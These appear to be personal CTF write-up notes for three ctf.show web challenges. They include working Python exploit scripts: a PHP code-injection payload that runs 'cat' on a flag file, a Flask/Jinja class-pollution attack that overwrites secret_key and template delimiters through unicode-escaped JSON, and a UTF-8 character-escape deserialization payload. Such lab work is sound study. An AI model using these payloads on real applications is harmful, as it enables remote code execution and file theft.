# CodeInject
	- ```python
	  url = "https://22f24a2f-f7f6-4e35-933a-cef26b490209.challenge.ctf.show/"
	  
	  r = base_post(url, data = {
	      "1": "(''.system('cat /000f1ag.txt'))"
	  })
	  print(r.text)
	  ```
- # easy_polluted
	- [[CTFWEB/Python/Python的原型链污染]]
	- 用`\u`绕过编码，然后污染`secret_key`和`variable_start_string`实现输出flag
	- ```python
	  def encode(d):
	  
	      s = json.dumps(d)
	      for match in re.findall('".+?"', s):
	          s = s.replace(
	              match, '"' + "".join("\\u00" + hex(ord(c))[2:] for c in match[1:-1]) + '"'
	          )
	      return s
	  
	  
	  r = base_post(
	      url,
	      headers={"Content-Type": "application/json"},
	      data=encode({"__init__": {"__globals__": {"app": {"secret_key": "114514"}}}}),
	  )
	  r = base_post(
	      url,
	      headers={"Content-Type": "application/json"},
	      data=encode(
	          {
	              "__init__": {
	                  "__globals__": {
	                      "app": {
	                          "jinja_env": {
	                              "variable_start_string": "[#",
	                              "variable_end_string": "#]",
	                          }
	                      }
	                  }
	              }
	          }
	      ),
	  )
	  ```
- # Ezzz_php
	- > 未解出，暂时找不到flag在哪里
	- 可以利用utf8的特性吃掉前面的`[`，同时利用utf8的特性形成字符逃逸，这样就可以在read参数中携带反序列化payload了
	- 读文件这么读
		- ```python
		  # url = "http://127.0.0.1:8081"
		  url = "https://46022ac3-97d6-4548-b17a-1c60c1ed7463.challenge.ctf.show/"
		  
		  payload = encoder.urldecode(shell.exec("php gen.php")[0])
		  payload = "%81" * (len(payload) + 1) + encoder.urlencode(payload)
		  print(payload)
		  
		  r = base_get(url, params={"start": "x" * 1000, "read": urldecode_to_bytes(payload)})
		  print(r.text)
		  ```